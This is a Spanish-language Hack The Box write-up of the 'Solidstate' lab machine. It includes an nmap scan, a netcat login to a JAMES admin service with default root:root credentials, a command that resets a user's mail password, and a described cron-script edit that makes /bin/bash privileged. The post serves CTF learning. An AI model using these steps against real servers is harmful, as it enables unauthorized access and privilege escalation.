---
title: Solidstate - WriteUp
date: 'Thu, 10 Jul 2025 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Linux
tags:
  - ctf
  - nmap
  - htb
  - linpeas
  - exploit
  - privesc
  - pspy
  - apache
  - cron
  - linux
image: /assets/img/cabeceras/2025-07-10-SOLIDSTATE-WRITEUP.png
description: >-
  SolidState es una máquina de dificultad media que requiere encadenar múltiples
  vectores de ataque para obtener un shell privilegiado. Como nota, en algunos
  casos el exploit puede no activarse más de una vez y es necesario reiniciar la
  máquina.
---

{% include machine-info.html
  machine="Solidstate"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}


## ENUMERACIÓN

NMAP
```bash
sudo nmap -sCV -A -p22,25,80,110,119,4555 10.129.29.189
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 13:20 CET
Nmap scan report for 10.129.29.189
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldnt establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 4.2 (95%), Linux 3.16 (95%), Linux 3.10 - 4.11 (95%), Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.13 or 4.2 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206205343.png)

## EXPLOTACIÓN Y ESCALADA

Buscando información sobre _James Remote Administration_, descubrimos que el servicio es fácilmente explotable y tiene como credenciales por defecto `root:root`.

```bash
$ nc -vn 10.129.230.95 4555
(UNKNOWN) [10.129.230.95] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
setpassword mindy mindy123
Password for mindy reset
```

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206204606.png)

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206200914.png)

```http
mindy:P@55W0rd1!2@
```

Conectamos por Telnet con las credenciales del email y subimos pspy32 y linpeas para enumerar. Nada más ejecutar el pspy ya vemos el primer vector de ataque para escalar privilegios. Se ve demasiado fácil para una máquina Medium...

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206203950.png)

Modificamos el archivo de la siguiente manera y ya solo tenemos que esperar para que root cambie los permisos de /bin/bash

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206204103.png)


Escalamos privilegios y chimpun.

![SOLIDSTATE](/assets/img/htb-writeups/Pasted-image-20240206204329.png)
---

**Última actualización**: 2025-07-10<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
